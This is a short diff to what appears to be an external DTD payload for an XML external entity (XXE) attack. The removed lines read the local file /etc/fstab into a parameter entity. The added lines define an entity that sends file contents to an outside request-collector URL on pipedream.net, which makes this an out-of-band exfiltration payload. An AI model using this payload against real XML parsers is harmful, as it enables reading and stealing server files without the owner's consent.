@@ -1,5 +1,2 @@
-<!ENTITY % file SYSTEM "file:///etc/fstab">
-<!ENTITY % start "<![CDATA[">
-<!ENTITY % end "]]>">
-<!ENTITY % all "<!ENTITY fileContents 
-'%start;%file;%end;'>">
+<!ENTITY % all "<!ENTITY send SYSTEM 'https://end7l0yp0boy.x.pipedream.net/?collect=%file;'>">
+%all;
